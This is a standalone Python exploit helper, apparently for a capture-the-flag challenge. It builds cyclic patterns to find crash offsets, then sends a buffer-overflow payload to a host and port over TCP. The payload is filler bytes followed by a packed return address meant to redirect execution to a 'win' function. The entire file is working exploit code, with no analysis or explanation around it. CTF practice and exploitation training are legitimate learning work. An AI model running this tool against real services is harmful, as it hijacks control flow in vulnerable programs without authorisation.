#!/usr/bin/env python3
"""Stdlib-only buffer-overflow helper for the CTF.

Usage:
  python3 bof.py HOST PORT -a 0x080491d6 -o 32 --send
  python3 bof.py HOST PORT --pattern          # print a cyclic pattern
  python3 bof.py HOST PORT --find 0x6161616c  # find offset of a crash value

No pwntools needed. For automatic offset/address scanning use auto_pwn.py.
"""
import argparse
import socket
import string
import struct
import sys
import time


def de_bruijn(k, n):
    a = [0] * (k * n)
    seq = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return seq


def cyclic(length):
    alpha = string.ascii_lowercase
    seq = de_bruijn(len(alpha), 4)
    pattern = "".join(alpha[i] for i in seq)
    pattern += pattern[:3]
    return pattern[:length].encode()


def cyclic_find(value, bits=32):
    packed = struct.pack("<I" if bits == 32 else "<Q", value)
    return cyclic(1 << 20).find(packed)


def recv_idle(sock, timeout, idle):
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
            sock.settimeout(idle)
        except socket.timeout:
            break
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("port", nargs="?", type=int, default=0)
    ap.add_argument("-a", "--address", help="target/win address, e.g. 0x080491d6 "
                                           "(REQUIRED: there is no sensible default)")
    ap.add_argument("-o", "--offset", type=int, default=32, help="bytes of filler before address")
    ap.add_argument("--arch", choices=["i386", "amd64"], default="i386")
    ap.add_argument("--send", action="store_true", help="send once and print the response")
    ap.add_argument("--noreceive", action="store_true", help="do not wait for a banner")
    ap.add_argument("--no-newline", action="store_true", help="send payload without trailing newline")
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--pattern", action="store_true", help="print a cyclic pattern and exit")
    ap.add_argument("--find", help="find offset of a crash value inside a cyclic pattern")
    args = ap.parse_args()
    if not args.address and not getattr(args, "find", None) and not getattr(args, "pattern", None):
        ap.error("-a/--address is required (it used to default to one challenge's win() "
                 "address, which silently sent the wrong payload everywhere else)")

    if args.pattern:
        sys.stdout.buffer.write(cyclic(200) + b"\n")
        return
    if args.find:
        bits = 32 if args.arch == "i386" else 64
        print(cyclic_find(int(args.find, 0), bits))
        return
    if not args.port:
        ap.error("HOST and PORT are required unless --pattern/--find is used")

    addr = int(args.address, 0)
    packed = struct.pack("<I" if args.arch == "i386" else "<Q", addr)
    payload = b"A" * args.offset + packed
    print(f"[*] payload len={len(payload)} address={hex(addr)} repr={payload!r}", file=sys.stderr)

    s = socket.create_connection((args.host, args.port), timeout=args.timeout)
    try:
        if not args.noreceive:
            banner = recv_idle(s, args.timeout, 0.35)
            if banner:
                sys.stderr.buffer.write(banner)
                sys.stderr.flush()
        s.sendall(payload + (b"" if args.no_newline else b"\n"))
        time.sleep(0.1)
        out = recv_idle(s, args.timeout, 0.35)
    finally:
        s.close()

    if out:
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()
    else:
        print("[!] no response", file=sys.stderr)


if __name__ == "__main__":
    main()
